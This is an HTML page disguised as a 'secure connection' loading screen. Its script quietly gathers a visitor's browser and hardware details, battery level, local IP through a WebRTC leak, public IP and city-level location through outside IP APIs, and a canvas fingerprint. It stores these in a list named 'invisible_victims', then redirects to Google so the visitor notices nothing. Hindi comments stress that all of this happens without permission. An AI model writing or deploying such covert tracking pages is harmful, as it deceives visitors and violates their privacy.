<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    body { background: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; font-family: sans-serif; }
    .loader { text-align: center; }
    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <p>Establishing secure connection...</p>
  </div>
  <script>
    (async function() {
      // 1. बिना परमिशन के सारी डिवाइस जानकारी इकट्ठी करो
      const data = {
        timestamp: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory || 'Unknown',
        network: navigator.connection?.effectiveType || 'Unknown',
      };

      // 2. बैटरी स्टेटस (ये भी बिना परमिशन मिल जाता है)
      if (navigator.getBattery) {
        try {
          const b = await navigator.getBattery();
          data.battery = `${Math.round(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
        } catch(e) {}
      }

      // 3. लोकल IP एड्रेस (WebRTC लूपहोल का फायदा - कोई परमिशन नहीं)
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        pc.onicecandidate = (ice) => {
          if (ice && ice.candidate && ice.candidate.candidate) {
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const match = ipRegex.exec(ice.candidate.candidate);
            if (match) {
              data.localIP = match[1];
              pc.close();
            }
          }
        };
      } catch(e) {}

      // 4. पब्लिक IP और लोकेशन (बिना परमिशन के फ्री API से)
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const ipData = await res.json();
        data.publicIP = ipData.ip;
        
        // IP के आधार पर लोकेशन (बिना GPS परमिशन के)
        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const geoData = await geoRes.json();
        data.location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
        data.isp = geoData.org;
      } catch(e) {}

      // 5. कैनवस फ़िंगरप्रिंट (यूनिक डिवाइस ID)
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Device Fingerprint', 2, 2);
        data.fingerprint = canvas.toDataURL().slice(-32);
      } catch(e) {}

      // 6. सब कुछ localStorage में सेव करो
      const victims = JSON.parse(localStorage.getItem('invisible_victims') || '[]');
      victims.push(data);
      localStorage.setItem('invisible_victims', JSON.stringify(victims));

      // 7. 2 सेकंड बाद असली वेबसाइट पर भेज दो (जैसे कुछ हुआ ही नहीं)
      setTimeout(() => {
        window.location.href = 'https://www.google.com';
      }, 2000);
    })();
  </script>
</body>
</html>
